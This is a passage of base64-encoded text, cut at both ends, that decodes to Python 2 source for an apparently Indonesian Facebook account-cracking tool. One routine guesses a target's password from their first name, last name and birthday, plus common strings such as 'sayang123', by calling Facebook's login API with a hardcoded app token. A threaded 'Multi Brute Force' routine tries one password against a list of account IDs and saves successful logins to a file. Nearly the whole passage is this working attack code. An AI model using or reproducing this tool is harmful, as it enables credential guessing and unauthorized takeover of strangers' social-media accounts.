goJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5N21bXDAzM1sxOzkxbUlORk9cMDMzWzE7OTdtXSBcMDMzWzE7OTFtVGhlIHRhcmdldCBhY2NvdW50IG11c3QgYmUgZnJpZW5kc1xuICAgICAgIHdpdGggeW91ciBhY2NvdW50IGZpcnN0ISIKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJdHJ5OgoJCWlkID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1UYXJnZXQgSUQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtV2FpdCBhIG1pbnV0ZSBcMDMzWzE7OTdtLi4uJykKCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJYSA9IGpzb24ubG9hZHMoci50ZXh0KQoJCXByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtIDogJythWyduYW1lJ10KCQlqYWxhbignXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtQ2hlY2sgXDAzM1sxOzk3bS4uLicpCgkJdGltZS5zbGVlcCgyKQoJCWphbGFuKCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1PcGVuIHBhc3N3b3JkIFwwMzNbMTs5N20uLi4nKQoJCXRpbWUuc2xlZXAoMikKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwejEgPSBhWydmaXJzdF9uYW1lJ10rJzEyMzQ1JwoJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejEpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCXkgPSBqc29uLmxvYWQoZGF0YSkKCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgoJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6MQoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQltZW51X2hhY2soKQoJCWVsc2U6CgkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB5WyJlcnJvcl9tc2ciXToKCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCgkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6MQoJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCW1lbnVfaGFjaygpCgkJCWVsc2U6CgkJCQlwejIgPSBhWydzYXlhbmcnXSAKCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejIpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJeSA9IGpzb24ubG9hZChkYXRhKQoJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToKCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6MgoJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJbWVudV9oYWNrKCkKCQkJCWVsc2U6CgkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOgoJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCgkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6MgoJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQltZW51X2hhY2soKQoJCQkJCWVsc2U6CgkJCQkJCXB6MyA9IGFbJ2xhc3RfbmFtZSddICsgJzEyMycKCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisoaWQpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHB6MykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCXkgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToKCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHozCgkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJZWxzZToKCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB5WyJlcnJvcl9tc2ciXToKCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHozCgkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQltZW51X2hhY2soKQoJCQkJCQkJZWxzZToKCQkJCQkJCQlsYWhpciA9IGFbJ2JpcnRoZGF5J10KCQkJCQkJCQlwejQgPSBsYWhpci5yZXBsYWNlKCcvJywgJycpCgkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisoaWQpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHB6NCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJeSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHk6CgkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHo0CgkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCW1lbnVfaGFjaygpCgkJCQkJCQkJZWxzZToKCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOgoJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHo0CgkJCQkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCWxhaGlycyA9IGFbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCWdheiA9IGxhaGlycy5yZXBsYWNlKCcvJywgJycpCgkJCQkJCQkJCQlwejUgPSBhWydmaXJzdF9uYW1lJ10rZ2F6CgkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHo1KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQkJCXkgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHk6CgkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejUKCQkJCQkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQkJCQkJCW1lbnVfaGFjaygpCgkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB5WyJlcnJvcl9tc2ciXToKCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgoJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejUKCQkJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQlwejYgPSAia29udG9sMTIzIgoJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHo2KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQkJCQkJeSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgoJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejYKCQkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQkJCQltZW51X2hhY2soKQoJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOgoJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgoJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejYKCQkJCQkJCQkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQkJCQkJCQkJCW1lbnVfaGFjaygpCgkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCXB6NyA9ICJzYXlhbmcxMjMiCgkJCQkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisoaWQpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHB6NykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQkJeSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHk6CgkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHo3CgkJCQkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQkJCQkJCW1lbnVfaGFjaygpCgkJCQkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOgoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKCQkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHo2CgkJCQkJCQkJCQkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQkJCQkJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFNvcnJ5LCBmYWlsZWQgdG8gb3BlbiB0aGUgdGFyZ2V0IHBhc3N3b3JkIDooIgoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gdHJ5IGl0IGFub3RoZXIgd2F5LiIKCQkJCQkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQkJCQkJCQltZW51X2hhY2soKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFRlcmdldCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2hhY2soKQoJCQkJCQkJCQkJCgkJCQkJCQkJCiMjIyMjIE11bHRpIEJydXRlIEZvcmNlICMjIyMjCiMjIyMjIENSQUNLICMjIyMKZGVmIGNyYWNrKCk6CglnbG9iYWwgaWRsaXN0LHBhc3N3LGZpbGUKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJaWRsaXN0ID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIElEICBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJykKCXBhc3N3ID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1QYXNzd29yZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJykKCXRyeToKCQlmaWxlID0gb3BlbigoaWRsaXN0KSwgInIiKQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCWZvciB4IGluIHJhbmdlKDQwKToKCQkJemVkZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNjcmFrLCBhcmdzPSgpKQoJCQl6ZWRkLnN0YXJ0KCkKCQkJdGhyZWFkcy5hcHBlbmQoemVkZCkKCQlmb3IgemVkZCBpbiB0aHJlYWRzOgoJCQl6ZWRkLmpvaW4oKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQgKCJcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfaGFjaygpCgkJCmRlZiBzY3JhaygpOgoJZ2xvYmFsIGJlcmhhc2lsLGNla3BvaW50LGdhZ2FsLGJhY2ssdXAKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCXRyeToKCQlidWthID0gb3BlbihpZGxpc3QsICJyIikKCQl1cCA9IGJ1a2EucmVhZCgpLnNwbGl0KCkKCQl3aGlsZSBmaWxlOgoJCQl1c2VybmFtZSA9IGZpbGUucmVhZGxpbmUoKS5zdHJpcCgpCgkJCXVybCA9ICJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcm5hbWUpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3N3KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IgoJCQlkYXRhID0gdXJsbGliLnVybG9wZW4odXJsKQoJCQltcHNoID0ganNvbi5sb2FkKGRhdGEpCgkJCWlmIGJhY2sgPT0gKGxlbih1cCkpOgoJCQkJYnJlYWsKCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gbXBzaDoKCQkJCWJpc2EgPSBvcGVuKCJvdXQvbWJmX29rLnR4dCIsICJ3IikKCQkJCWJpc2Eud3JpdGUodXNlcm5hbWUrInwiK3Bhc3N3KyJcbiIpCgkJCQliaXNhLmNsb3NlKCkKCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcm5hbWUrIj9hY2Nlc3NfdG9rZW49IittcHNoWydhY2Nlc3NfdG9rZW4nXSkKCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCWJlcmhhc2lsLmFwcGVuZCgiXDAzM1